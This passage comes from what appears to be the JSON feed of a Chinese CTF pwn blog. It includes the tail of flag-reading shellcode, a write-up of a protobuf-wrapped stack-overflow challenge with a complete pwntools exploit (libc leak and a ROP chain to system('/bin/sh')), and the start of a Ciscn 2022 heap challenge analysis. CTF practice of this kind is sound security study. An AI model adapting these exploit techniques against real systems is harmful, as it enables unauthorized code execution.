rdi,rdi;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>xor rdx,rdx;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>push 0x101;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>/* ioc */</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>push 0x70; </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>push rsp;pop rax;inc ah;push rax;push rsp;pop r15;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>/* preadv2 */</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>push 3;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>push r15;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>push 0;</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>pop r10;</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>push 0;</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pop r8;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>push 327;</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>/* dup2 */</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>push 1001;</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>push 33;</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>/* writev */</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>pop rdi;</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>push r15;</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>push 1;</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>push 20;</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\"\"\"</span></span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>se<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/春秋杯夏季赛/image-20240706172852649.png\" alt=\"image-20240706172852649\" style=\"zoom:80%;\" />\n<h3 id=\"simplesys\"><a class=\"markdownIt-Anchor\" href=\"#simplesys\">#</a> simpleSys</h3>\n<p>fix</p>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706173124375.png\" alt=\"image-20240706173124375\"></p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "url": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "title": "protocol学习",
            "date_published": "2024-06-28T03:10:40.000Z",
            "content_html": "<h1 id=\"protocol\"><a class=\"markdownIt-Anchor\" href=\"#protocol\">#</a> protocol</h1>\n<blockquote>\n<p>前言：</p>\n<p>华中赛区题目，第一次，由此记录一下</p>\n</blockquote>\n<p>文档：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm90b2J1Zi5kZXYvb3ZlcnZpZXcv\">https://protobuf.dev/overview/</span></p>\n<p>如何去还原此结构：</p>\n<p>我的方案如下</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hcmluLW0vcGJ0ay5naXQ=\">https://github.com/marin-m/pbtk.git</span></p>\n<p>sudo apt install protobuf-compiler</p>\n</blockquote>\n<p>先进行必要的安装配置</p>\n<p>接下来去生成导入的 py 包</p>\n<blockquote>\n<p>./extractors/from_binary.py ./pwn</p>\n<p>protoc --python_out=. ./filename.proto</p>\n</blockquote>\n<p><img data-src=\"/img/protocol/image-20240628092648137.png\" alt=\"image-20240628092648137\"></p>\n<p>即可得到上面文件</p>\n<h2 id=\"题目启动\"><a class=\"markdownIt-Anchor\" href=\"#题目启动\">#</a> 题目启动</h2>\n<h3 id=\"检查保护\"><a class=\"markdownIt-Anchor\" href=\"#检查保护\">#</a> 检查保护</h3>\n<p><img data-src=\"/img/protocol/image-20240628093304459.png\" alt=\"image-20240628093304459\"></p>\n<p>运行一波程序看看咋样</p>\n<p><img data-src=\"/img/protocol/image-20240628093431819.png\" alt=\"image-20240628093431819\"></p>\n<h3 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h3>\n<p>输入会输出这个，去定位一下</p>\n<p><img data-src=\"/img/protocol/image-20240628093536176.png\" alt=\"image-20240628093536176\"></p>\n<p>if 判断 v5 是否返回 1，返回 0 则会输出 <code>Protobuf Parse Error!</code></p>\n<p><img data-src=\"/img/protocol/image-20240628093750454.png\" alt=\"image-20240628093750454\"></p>\n<p>可以发现，我们 v6 向 s 所在地址去输入，而 v5 所指向的函数应该是检测 s 地址内容的函数</p>\n<p>GPT 解释如下</p>\n<p><code>google::protobuf::MessageLite::ParseFromArray</code>  是 Google Protocol Buffers (protobuf) 库中用于解析二进制数据的方法。它从给定的字节数组中解析数据并将其填充到相应的 protobuf 消息中。</p>\n<p>让我们分解一下这个函数调用：</p>\n<pre><code class=\"language-c++\">google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;unk_209080, s, v6);\n</code></pre>\n<ul>\n<li>\n<p><code>google::protobuf::MessageLite</code>  是一个抽象基类，它定义了所有 protobuf 消息的基本接口和操作。 <code>ParseFromArray</code>  是这个类中的一个成员函数。</p>\n</li>\n<li>\n<p><code>ParseFromArray</code>  函数的签名通常是这样的：</p>\n<pre><code class=\"language-c++\">bool ParseFromArray(const void* data, int size);\n</code></pre>\n<p>它从一个给定大小的字节数组 ( <code>data</code>  开始，大小为  <code>size</code> ) 中解析 protobuf 消息。</p>\n</li>\n<li>\n<p>在这个调用中：</p>\n<ul>\n<li><code>(google::protobuf::MessageLite *)&amp;unk_209080</code>  是一个指向  <code>google::protobuf::MessageLite</code>  派生类实例的指针，表示要将解析得到的数据填充到  <code>unk_209080</code>  对象中。</li>\n<li><code>s</code>  是一个指向字节数组的指针，表示数据来源。</li>\n<li><code>v6</code>  是一个整数，表示字节数组的大小（即  <code>s</code>  的长度）。</li>\n</ul>\n</li>\n</ul>\n<p>换句话说，这个函数调用试图从字节数组  <code>s</code>  中读取  <code>v6</code>  个字节，并将解析得到的消息存储到  <code>unk_209080</code>  对象中。</p>\n<p>如果解析成功， <code>ParseFromArray</code>  将返回  <code>true</code> ；如果失败，则返回  <code>false</code> 。通常情况下，失败的原因可能包括数据格式不正确或数组长度不够等。</p>\n<p>所以如果我们解析失败则不去往下去执行</p>\n<p>unk_209080 填充数据地方只有 1bit 大小空间</p>\n<p><img data-src=\"/img/protocol/image-20240628095136822.png\" alt=\"image-20240628095136822\"></p>\n<p>我们很难进行自己去输入测试</p>\n<p>看下结构体</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>message protoMessage <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    optional string name <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    optional string phoneNumber <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    required <span class=\"token builtin\">bytes</span> <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    required uint32 size <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>optional 可选项</p>\n<p>required 需要写入</p>\n<blockquote>\n<p>封装函数</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_payload</span><span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'aaaa'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/protocol/image-20240628102847682.png\" alt=\"image-20240628102847682\"></p>\n<p>这样我们就可以成功的去执行了</p>\n<h3 id=\"寻找漏洞\"><a class=\"markdownIt-Anchor\" href=\"#寻找漏洞\">#</a> 寻找漏洞</h3>\n<p><img data-src=\"/img/protocol/image-20240628103148873.png\" alt=\"image-20240628103148873\"></p>\n<p>n [0] 是我们输入 buf 的大小，n [1] 是我们输入的内容。而前面可以设置最大为 0x1000 很明显有栈溢出漏洞。</p>\n<p>给出给的 puts 函数的地址，构造合理的 rop 或者 one_gadget（后来发现 one_gadget 没有相应的条件</p>\n<p>完整 exp 如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>puts_libc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvn<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002164f</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ret <span class=\"token operator\">=</span> rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f29e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f2a5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f302</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a2fc</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x218</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "栈劫持",
                "protocol"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/06/21/Ciscn-2022-blue/",
            "url": "https://yhuanhuan01.github.io/2024/06/21/Ciscn-2022-blue/",
            "title": "Ciscn_2022_blue",
            "date_published": "2024-06-21T08:46:04.000Z",
            "content_html": "<h1 id=\"ciscn_2022-blue\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-blue\">#</a> Ciscn_2022 blue</h1>\n<blockquote>\n<p>前言：一道 2.31 的 glibc 堆题（国赛将至，复现一下吧</p>\n</blockquote>\n<h2 id=\"了解程序\"><a class=\"markdownIt-Anchor\" href=\"#了解程序\">#</a> 了解程序</h2>\n<p>首先需要检查程序保护</p>\n<h3 id=\"保护全开\"><a class=\"markdownIt-Anchor\" href=\"#保护全开\">#</a> 保护全开</h3>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621141324623.png\" alt=\"image-20240621141324623\"></p>\n<p>Ida 分析一下程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">sub_1730</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">sub_18D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 菜单，无 edit</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//str_2_int</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">sub_14C5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//show</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">sub_138A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//add</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token 